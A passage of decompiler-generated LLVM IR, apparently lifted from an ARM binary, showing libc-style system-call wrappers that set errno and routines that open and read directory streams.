  br i1 %tmp, label %dec_label_pc_10d14, label %dec_label_pc_10d04

dec_label_pc_10d04:                               ; preds = %dec_label_pc_10ce8
  %v0_10d04 = call i32 @function_11204()
  %v0_10d08 = load i32, i32* %r7.global-to-local, align 4
  %v1_10d08 = sub i32 0, %v0_10d08
  %v2_10d0c = inttoptr i32 %v0_10d04 to i32*
  store i32 %v1_10d08, i32* %v2_10d0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10d14.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10d14

dec_label_pc_10d14:                               ; preds = %dec_label_pc_10ce8, %dec_label_pc_10d04
  %v1_10d18 = phi i32 [ %v0_10cf4, %dec_label_pc_10ce8 ], [ -1, %dec_label_pc_10d04 ]
  %v2_10d14 = phi i32 [ %v3_10ce8, %dec_label_pc_10ce8 ], [ %v2_10d14.pre, %dec_label_pc_10d04 ]
  store i32 %v2_10d14, i32* @r7, align 4
  ret i32 %v1_10d18

; uselistorder directives
  uselistorder i32 %v0_10cf4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d14, { 1, 0 }
}

define i32 @function_10d1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d1c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10d1c = load i32, i32* @r7, align 4
  store i32 %v3_10d1c, i32* %stack_var_-8, align 4
  %v0_10d28 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10d28, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10d28, -4095
  br i1 %tmp, label %dec_label_pc_10d48, label %dec_label_pc_10d38

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10d1c
  %v0_10d38 = call i32 @function_11204()
  %v0_10d3c = load i32, i32* %r7.global-to-local, align 4
  %v1_10d3c = sub i32 0, %v0_10d3c
  %v2_10d40 = inttoptr i32 %v0_10d38 to i32*
  store i32 %v1_10d3c, i32* %v2_10d40, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10d48.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10d1c, %dec_label_pc_10d38
  %v1_10d4c = phi i32 [ %v0_10d28, %dec_label_pc_10d1c ], [ -1, %dec_label_pc_10d38 ]
  %v2_10d48 = phi i32 [ %v3_10d1c, %dec_label_pc_10d1c ], [ %v2_10d48.pre, %dec_label_pc_10d38 ]
  store i32 %v2_10d48, i32* @r7, align 4
  ret i32 %v1_10d4c

; uselistorder directives
  uselistorder i32 %v0_10d28, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d48, { 1, 0 }
}

define i32 @function_10d50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10d50:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_10d50 = load i32, i32* @r3, align 4
  store i32 %v9_10d50, i32* %stack_var_-4, align 4
  %v2_10d5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10d5c, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10d90, label %dec_label_pc_10d80

dec_label_pc_10d80:                               ; preds = %dec_label_pc_10d50
  %v0_10d80 = call i32 @function_11204()
  %v0_10d84 = load i32, i32* %r7.global-to-local, align 4
  %v1_10d84 = sub i32 0, %v0_10d84
  store i32 %v1_10d84, i32* @r3, align 4
  %v2_10d88 = inttoptr i32 %v0_10d80 to i32*
  store i32 %v1_10d84, i32* %v2_10d88, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d50, %dec_label_pc_10d80
  %v0_10d90 = phi i32 [ %arg1, %dec_label_pc_10d50 ], [ -1, %dec_label_pc_10d80 ]
  ret i32 %v0_10d90

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d90, { 1, 0 }
}

define i32 @function_10da4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10da4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10da4 = load i32, i32* @r7, align 4
  store i32 %v3_10da4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10dd0, label %dec_label_pc_10dc0

dec_label_pc_10dc0:                               ; preds = %dec_label_pc_10da4
  %v0_10dc0 = call i32 @function_11204()
  %v0_10dc4 = load i32, i32* %r7.global-to-local, align 4
  %v1_10dc4 = sub i32 0, %v0_10dc4
  %v2_10dc8 = inttoptr i32 %v0_10dc0 to i32*
  store i32 %v1_10dc4, i32* %v2_10dc8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10dd4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10dd0

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10da4, %dec_label_pc_10dc0
  %v2_10dd4 = phi i32 [ %v3_10da4, %dec_label_pc_10da4 ], [ %v2_10dd4.pre, %dec_label_pc_10dc0 ]
  %v0_10dd0 = phi i32 [ %arg1, %dec_label_pc_10da4 ], [ -1, %dec_label_pc_10dc0 ]
  store i32 %v2_10dd4, i32* @r7, align 4
  ret i32 %v0_10dd0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10dd0, { 1, 0 }
}

define i32 @function_10ddc(i32 %arg1) local_unnamed_addr {
dec_label_pc_10ddc:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ddc = load i32, i32* @r7, align 4
  store i32 %v3_10ddc, i32* %stack_var_-8, align 4
  %v0_10de8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10de8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10de8, -4095
  br i1 %tmp, label %dec_label_pc_10e08, label %dec_label_pc_10df8

dec_label_pc_10df8:                               ; preds = %dec_label_pc_10ddc
  %v0_10df8 = call i32 @function_11204()
  %v0_10dfc = load i32, i32* %r7.global-to-local, align 4
  %v1_10dfc = sub i32 0, %v0_10dfc
  store i32 %v1_10dfc, i32* @r3, align 4
  %v2_10e00 = inttoptr i32 %v0_10df8 to i32*
  store i32 %v1_10dfc, i32* %v2_10e00, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10e08.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e08

dec_label_pc_10e08:                               ; preds = %dec_label_pc_10ddc, %dec_label_pc_10df8
  %v1_10e0c = phi i32 [ %v0_10de8, %dec_label_pc_10ddc ], [ -1, %dec_label_pc_10df8 ]
  %v2_10e08 = phi i32 [ %v3_10ddc, %dec_label_pc_10ddc ], [ %v2_10e08.pre, %dec_label_pc_10df8 ]
  store i32 %v2_10e08, i32* @r7, align 4
  ret i32 %v1_10e0c

; uselistorder directives
  uselistorder i32 %v0_10de8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e08, { 1, 0 }
}

define i32 @function_10e10(i32* %arg1) local_unnamed_addr {
dec_label_pc_10e10:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10e10 = load i32, i32* @r4, align 4
  store i32 %v3_10e10, i32* %stack_var_-24, align 4
  %v9_10e10 = load i32, i32* @r6, align 4
  %v12_10e10 = load i32, i32* @r7, align 4
  %v15_10e10 = load i32, i32* @r8, align 4
  %v18_10e10 = load i32, i32* @lr, align 4
  %v2_10e14 = load i32, i32* %arg1, align 4
  store i32 %v2_10e14, i32* %r4.global-to-local, align 4
  %v3_10e1c = icmp eq i32 %v2_10e14, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 124820, i32* @r6, align 4
  br i1 %v3_10e1c, label %dec_label_pc_10e30, label %dec_label_pc_10e44

dec_label_pc_10e30:                               ; preds = %dec_label_pc_10e10
  %v0_10e30 = call i32 @function_11204()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_10e38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10e38, i32* %r2.global-to-local, align 4
  %v2_10e3c = inttoptr i32 %v0_10e30 to i32*
  store i32 9, i32* %v2_10e3c, align 4
  %v0_10ee4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ee4

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e10
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_10e48 = add i32 %tmp, 24
  store i32 %v1_10e48, i32* %r4.global-to-local, align 4
  store i32 %v1_10e48, i32* %r2.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_10e5c = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10e5c)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_10e74 = load i32, i32* @r6, align 4
  %v2_10e74 = add i32 %v0_10e74, 16
  %v3_10e74 = inttoptr i32 %v2_10e74 to i32*
  %v4_10e74 = load i32, i32* %v3_10e74, align 4
  call void @__pseudo_branch(i32 %v4_10e74)
  %v0_10e80 = load i32, i32* @r7, align 4
  %v1_10e80 = inttoptr i32 %v0_10e80 to i32*
  %v2_10e80 = load i32, i32* %v1_10e80, align 4
  store i32 %v2_10e80, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_10e90 = load i32, i32* @r8, align 4
  store i32 %v0_10e90, i32* %v1_10e80, align 4
  %v0_10e94 = load i32, i32* @r6, align 4
  %v1_10e94 = load i32, i32* %r3.global-to-local, align 4
  %v2_10e94 = add i32 %v1_10e94, %v0_10e94
  %v3_10e94 = inttoptr i32 %v2_10e94 to i32*
  %v4_10e94 = load i32, i32* %v3_10e94, align 4
  store i32 %v4_10e94, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_10ea0.336 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10e94)
  %v0_10ea0 = load i32, i32* @r7, align 4
  %v1_10ea0 = add i32 %v0_10ea0, 12
  %v2_10ea0 = inttoptr i32 %v1_10ea0 to i32*
  %v3_10ea0 = load i32, i32* %v2_10ea0, align 4
  store i32 %v3_10ea0, i32* @r0, align 4
  %v0_10ea4 = call i32 @function_128a8()
  %v0_10ea8 = load i32, i32* @r7, align 4
  store i32 %v0_10ea8, i32* @r0, align 4
  %v0_10eac = call i32 @function_128a8()
  %v0_10eb4 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_10eb4, -4095
  br i1 %tmp11, label %dec_label_pc_10ee0, label %dec_label_pc_10ed0

dec_label_pc_10ed0:                               ; preds = %dec_label_pc_10e44
  %v0_10ed0 = call i32 @function_11204()
  %v0_10ed4 = load i32, i32* @r4, align 4
  %v1_10ed4 = sub i32 0, %v0_10ed4
  store i32 %v1_10ed4, i32* %r3.global-to-local, align 4
  %v2_10ed8 = inttoptr i32 %v0_10ed0 to i32*
  store i32 %v1_10ed4, i32* %v2_10ed8, align 4
  %v0_10edc = load i32, i32* @r8, align 4
  br label %dec_label_pc_10ee0

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10e44, %dec_label_pc_10ed0
  %v0_10ee0 = phi i32 [ %v0_10eb4, %dec_label_pc_10e44 ], [ %v0_10edc, %dec_label_pc_10ed0 ]
  store i32 %v0_10ee0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ee4

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10e30, %dec_label_pc_10ee0
  %v0_10ee4 = phi i32 [ %v0_10ee4.pre, %dec_label_pc_10e30 ], [ %v0_10ee0, %dec_label_pc_10ee0 ]
  %v2_10eec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10eec, i32* @r4, align 4
  store i32 %v9_10e10, i32* @r6, align 4
  store i32 %v12_10e10, i32* @r7, align 4
  store i32 %v15_10e10, i32* @r8, align 4
  store i32 %v18_10e10, i32* @lr, align 4
  ret i32 %v0_10ee4

; uselistorder directives
  uselistorder i32 %v0_10eb4, { 1, 0 }
  uselistorder label %dec_label_pc_10ee4, { 1, 0 }
  uselistorder label %dec_label_pc_10ee0, { 1, 0 }
}

define i32 @function_10ef8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10ef8:
  %v0_10ef8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10ef8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10ef8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10ef8, %bb
  %v10_10f04 = phi i32 [ %arg1, %dec_label_pc_10ef8 ], [ 0, %bb ]
  ret i32 %v10_10f04

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_10f08(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10f08:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_10f08 = load i32, i32* @r5, align 4
  %v9_10f08 = load i32, i32* @r6, align 4
  %v12_10f08 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_10f1c = call i32 @function_1183c()
  %v2_10f24 = icmp eq i32 %v0_10f1c, 0
  store i32 124820, i32* @r6, align 4
  br i1 %v2_10f24, label %bb, label %dec_label_pc_10f34

bb:                                               ; preds = %dec_label_pc_10f08
  br label %dec_label_pc_10fc0

dec_label_pc_10f34:                               ; preds = %dec_label_pc_10f08
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10f38 = load i32, i32* @r4, align 4
  %v2_10f38 = icmp ugt i32 %v0_10f38, 511
  %v2_10f3c = add i32 %v0_10f1c, 4
  %v3_10f3c = inttoptr i32 %v2_10f3c to i32*
  store i32 0, i32* %v3_10f3c, align 4
  %v0_10f40 = load i32, i32* %r3.global-to-local, align 4
  %v2_10f40 = add i32 %v0_10f1c, 16
  %v3_10f40 = inttoptr i32 %v2_10f40 to i32*
  store i32 %v0_10f40, i32* %v3_10f40, align 4
  %v0_10f44 = load i32, i32* %r3.global-to-local, align 4
  %v2_10f44 = add i32 %v0_10f1c, 8
  %v3_10f44 = inttoptr i32 %v2_10f44 to i32*
  store i32 %v0_10f44, i32* %v3_10f44, align 4
  br i1 %v2_10f38, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_10f34
  %v0_10f4c2 = load i32, i32* @r4, align 4
  %v2_10f4c3 = add i32 %v0_10f1c, 20
  %v3_10f4c4 = inttoptr i32 %v2_10f4c3 to i32*
  store i32 %v0_10f4c2, i32* %v3_10f4c4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_10f34
  %v1_10f48 = load i32, i32* %r3.global-to-local, align 4
  %v2_10f48 = add i32 %v1_10f48, 512
  store i32 %v2_10f48, i32* %r3.global-to-local, align 4
  %v0_10f4c = load i32, i32* @r4, align 4
  %v2_10f4c = add i32 %v0_10f1c, 20
  %v3_10f4c = inttoptr i32 %v2_10f4c to i32*
  store i32 %v0_10f4c, i32* %v3_10f4c, align 4
  %v1_10f50 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_10f50, i32* %v3_10f4c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_10f1c, i32* @r5, align 4
  %v0_10f58 = load i32, i32* @r7, align 4
  %v2_10f58 = inttoptr i32 %v0_10f1c to i32*
  store i32 %v0_10f58, i32* %v2_10f58, align 4
  %v0_10f5c = load i32, i32* @r5, align 4
  %v1_10f5c = add i32 %v0_10f5c, 20
  %v2_10f5c = inttoptr i32 %v1_10f5c to i32*
  %v3_10f5c = load i32, i32* %v2_10f5c, align 4
  store i32 %v3_10f5c, i32* %r1.global-to-local, align 4
  %v2_10f64 = call i32 @function_1215c(i32 1, i32 %v3_10f5c)
  %v2_10f68 = icmp eq i32 %v2_10f64, 0
  store i32 %v2_10f64, i32* @r4, align 4
  %v1_10f70 = load i32, i32* @r5, align 4
  %v2_10f70 = add i32 %v1_10f70, 12
  %v3_10f70 = inttoptr i32 %v2_10f70 to i32*
  store i32 %v2_10f64, i32* %v3_10f70, align 4
  br i1 %v2_10f68, label %dec_label_pc_10f78, label %dec_label_pc_10f88

dec_label_pc_10f78:                               ; preds = %bb17
  %v0_10f78 = load i32, i32* @r5, align 4
  store i32 %v0_10f78, i32* @r0, align 4
  %v0_10f7c = call i32 @function_128a8()
  %v0_10f80 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10fc0

dec_label_pc_10f88:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_10fb0 = load i32, i32* @r5, align 4
  %v1_10fb0 = add i32 %v0_10fb0, 24
  %v1_10fb4 = inttoptr i32 %v1_10fb0 to i32*
  store i32 0, i32* %v1_10fb4, align 4
  %v3_10fb4 = add i32 %v0_10fb0, 28
  %v4_10fb4 = inttoptr i32 %v3_10fb4 to i32*
  %v5_10fb4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10fb4, i32* %v4_10fb4, align 4
  %v6_10fb4 = add i32 %v0_10fb0, 32
  %v7_10fb4 = inttoptr i32 %v6_10fb4 to i32*
  %v8_10fb4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_10fb4, i32* %v7_10fb4, align 4
  %v9_10fb4 = add i32 %v0_10fb0, 36
  %v10_10fb4 = inttoptr i32 %v9_10fb4 to i32*
  %v11_10fb4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_10fb4, i32* %v10_10fb4, align 4
  %v12_10fb4 = add i32 %v0_10fb0, 40
  store i32 %v12_10fb4, i32* @ip, align 4
  %v2_10fb8 = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_10fbc = inttoptr i32 %v12_10fb4 to i32*
  store i32 %v2_10fb8, i32* %v1_10fbc, align 4
  %v3_10fbc = add i32 %v0_10fb0, 44
  %v4_10fbc = inttoptr i32 %v3_10fbc to i32*
  %v5_10fbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10fbc, i32* %v4_10fbc, align 4
  %v0_10fc0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10fc0

dec_label_pc_10fc0:                               ; preds = %bb, %dec_label_pc_10f78, %dec_label_pc_10f88
  %v0_10fc0 = phi i32 [ 0, %bb ], [ %v0_10f80, %dec_label_pc_10f78 ], [ %v0_10fc0.pre, %dec_label_pc_10f88 ]
  store i32 %v6_10f08, i32* @r5, align 4
  store i32 %v9_10f08, i32* @r6, align 4
  store i32 %v12_10f08, i32* @r7, align 4
  ret i32 %v0_10fc0

; uselistorder directives
  uselistorder i32 %v2_10f64, { 1, 0, 2 }
  uselistorder i32 %v0_10f1c, { 6, 5, 4, 0, 1, 2, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 512, { 7, 4, 0, 1, 8, 5, 9, 6, 10, 2, 11, 3, 12 }
  uselistorder label %dec_label_pc_10fc0, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_10fd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10fd8:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v6_10fd8 = load i32, i32* @r7, align 4
  %v2_10fe0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_11008, label %dec_label_pc_10ff8

dec_label_pc_10ff8:                               ; preds = %dec_label_pc_10fd8
  %v0_10ff8 = call i32 @function_11204()
  %v0_10ffc = load i32, i32* @r7, align 4
  %v1_10ffc = sub i32 0, %v0_10ffc
  %v2_11000 = inttoptr i32 %v0_10ff8 to i32*
  store i32 %v1_10ffc, i32* %v2_11000, align 4
  br label %dec_label_pc_1102c

dec_label_pc_11008:                               ; preds = %dec_label_pc_10fd8
  %v1_11008 = icmp slt i32 %arg1, 0
  br i1 %v1_11008, label %dec_label_pc_1102c, label %dec_label_pc_11010

dec_label_pc_11010:                               ; preds = %dec_label_pc_11008
  store i32 %v2_10fe0, i32* @r1, align 4
  %v0_11014 = call i32 @function_13d58()
  %v1_11018 = icmp slt i32 %v0_11014, 0
  br i1 %v1_11018, label %dec_label_pc_11020, label %dec_label_pc_11034

dec_label_pc_11020:                               ; preds = %dec_label_pc_11010
  br label %dec_label_pc_1102c

dec_label_pc_1102c:                               ; preds = %dec_label_pc_11020, %dec_label_pc_11008, %dec_label_pc_10ff8
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11070

dec_label_pc_11034:                               ; preds = %dec_label_pc_11010
  %v0_1103c = load i32, i32* @r7, align 4
  %v3_11040 = call i32 @function_10c7c(i32 %v0_1103c, i32 2, i32 1)
  %v0_11044 = load i32, i32* @r7, align 4
  %v2_1104c = call i32 @function_10f08(i32 %v0_11044, i32 %tmp)
  store i32 %v2_1104c, i32* %r4.global-to-local, align 4
  %v2_11050 = icmp eq i32 %v2_1104c, 0
  br i1 %v2_11050, label %dec_label_pc_11058, label %dec_label_pc_11070

dec_label_pc_11058:                               ; preds = %dec_label_pc_11034
  %v0_11064 = call i32 @function_11204()
  %v2_1106c = inttoptr i32 %v0_11064 to i32*
  store i32 12, i32* %v2_1106c, align 4
  %v0_11070.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11070

dec_label_pc_11070:                               ; preds = %dec_label_pc_11034, %dec_label_pc_1102c, %dec_label_pc_11058
  %v0_11070 = phi i32 [ %v2_1104c, %dec_label_pc_11034 ], [ 0, %dec_label_pc_1102c ], [ %v0_11070.pre, %dec_label_pc_11058 ]
  store i32 %v6_10fd8, i32* @r7, align 4
  ret i32 %v0_11070

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_11070, { 2, 0, 1 }
}

define i32 @function_11080(i32 %arg1) local_unnamed_addr {
dec_label_pc_11080:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_11080 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11080, label %bb, label %dec_label_pc_11080._crit_edge

dec_label_pc_11080._crit_edge:                    ; preds = %dec_label_pc_11080
  br label %bb11

bb:                                               ; preds = %dec_label_pc_11080
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_11080._crit_edge, %bb
  %v2_11088 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_11088, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11094 = call i32 @function_13d58()
  store i32 %v0_11094, i32* @r5, align 4
  %v2_11098 = icmp eq i32 %v0_11094, 0
  br i1 %v2_11098, label %dec_label_pc_110a0, label %dec_label_pc_11108

dec_label_pc_110a0:                               ; preds = %bb11
  %v1_110a4 = and i32 %tmp5, ptrtoint (i32* @global_var_f000.346 to i32)
  store i32 %v1_110a4, i32* @r3, align 4
  %v7_110a8 = icmp eq i32 %v1_110a4, 16384
  br i1 %v7_110a8, label %dec_label_pc_110c0, label %dec_label_pc_110b0

dec_label_pc_110b0:                               ; preds = %dec_label_pc_110a0
  %v0_110b0 = call i32 @function_11204()
  br label %dec_label_pc_110ec

dec_label_pc_110c0:                               ; preds = %dec_label_pc_110a0
  %v0_110c0 = load i32, i32* @r4, align 4
  %v2_110c8 = call i32 @function_10c10(i32 %v0_110c0, i32 3)
  %v7_110cc = icmp eq i32 %v2_110c8, -1
  br i1 %v7_110cc, label %dec_label_pc_11108, label %dec_label_pc_110d4

dec_label_pc_110d4:                               ; preds = %dec_label_pc_110c0
  %v1_110d4 = urem i32 %v2_110c8, 4
  %v7_110d8 = icmp eq i32 %v1_110d4, 1
  br i1 %v7_110d8, label %dec_label_pc_110e0, label %dec_label_pc_110f4

dec_label_pc_110e0:                               ; preds = %dec_label_pc_110d4
  %v0_110e0 = call i32 @function_11204()
  br label %dec_label_pc_110ec

dec_label_pc_110ec:                               ; preds = %dec_label_pc_110b0, %dec_label_pc_110e0
  %storemerge2 = phi i32 [ %v0_110b0, %dec_label_pc_110b0 ], [ %v0_110e0, %dec_label_pc_110e0 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_110b0 ], [ 22, %dec_label_pc_110e0 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_110ec = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_110ec, align 4
  %v0_1110c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1110c

dec_label_pc_110f4:                               ; preds = %dec_label_pc_110d4
  %v0_110f4 = load i32, i32* @r4, align 4
  %v2_110fc = call i32 @function_10f08(i32 %v0_110f4, i32 %tmp)
  store i32 %v2_110fc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1110c

dec_label_pc_11108:                               ; preds = %bb11, %dec_label_pc_110c0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1110c

dec_label_pc_1110c:                               ; preds = %dec_label_pc_110f4, %dec_label_pc_110ec, %dec_label_pc_11108
  %v0_1110c = phi i32 [ %v2_110fc, %dec_label_pc_110f4 ], [ %v0_1110c.pre, %dec_label_pc_110ec ], [ 0, %dec_label_pc_11108 ]
  ret i32 %v0_1110c

; uselistorder directives
  uselistorder i32 %v2_110c8, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_10f08, { 1, 0 }
  uselistorder i32 ()* @function_13d58, { 1, 0 }
  uselistorder label %dec_label_pc_1110c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11108, { 1, 0 }
  uselistorder label %dec_label_pc_110ec, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_1111c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1111c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1111c = load i32, i32* @r4, align 4
  %v6_1111c = load i32, i32* @r5, align 4
  %v9_1111c = load i32, i32* @r6, align 4
  %v12_1111c = load i32, i32* @r7, align 4
  %v15_1111c = load i32, i32* @lr, align 4
  store i32 124820, i32* @r6, align 4
  %v1_11130 = add i32 %tmp, 24
  store i32 %v1_11130, i32* @r4, align 4
  %v4_11134 = load i32, i32* inttoptr (i32 124856 to i32*), align 8
  store i32 %v4_11134, i32* %r1.global-to-local, align 4
  store i32 %v1_11130, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_11148 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11148)
  %v0_1115c = load i32, i32* @r6, align 4
  %v2_1115c = add i32 %v0_1115c, 16
  %v3_1115c = inttoptr i32 %v2_1115c to i32*
  %v4_1115c = load i32, i32* %v3_1115c, align 4
  store i32 %v4_1115c, i32* @ip, align 4
  store i32 69992, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1115c)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %dec_label_pc_1119c, %dec_label_pc_1111c
  %v0_1116c = load i32, i32* @r5, align 4
  %v1_1116c = add i32 %v0_1116c, 4
  %v2_1116c = inttoptr i32 %v1_1116c to i32*
  %v3_1116c = load i32, i32* %v2_1116c, align 4
  store i32 %v3_1116c, i32* %r2.global-to-local, align 4
  %v4_1116c = add i32 %v0_1116c, 8
  %v5_1116c = inttoptr i32 %v4_1116c to i32*
  %v6_1116c = load i32, i32* %v5_1116c, align 4
  %tmp10 = icmp ugt i32 %v6_1116c, %v3_1116c
  br i1 %tmp10, label %dec_label_pc_1119c, label %dec_label_pc_11178

dec_label_pc_11178:                               ; preds = %dec_label_pc_1116c
  %v1_11178 = inttoptr i32 %v0_1116c to i32*
  %v2_11178 = load i32, i32* %v1_11178, align 4
  %v1_1117c = add i32 %v0_1116c, 12
  %v2_1117c = inttoptr i32 %v1_1117c to i32*
  %v3_1117c = load i32, i32* %v2_1117c, align 4
  store i32 %v3_1117c, i32* %r1.global-to-local, align 4
  %v1_11180 = add i32 %v0_1116c, 20
  %v2_11180 = inttoptr i32 %v1_11180 to i32*
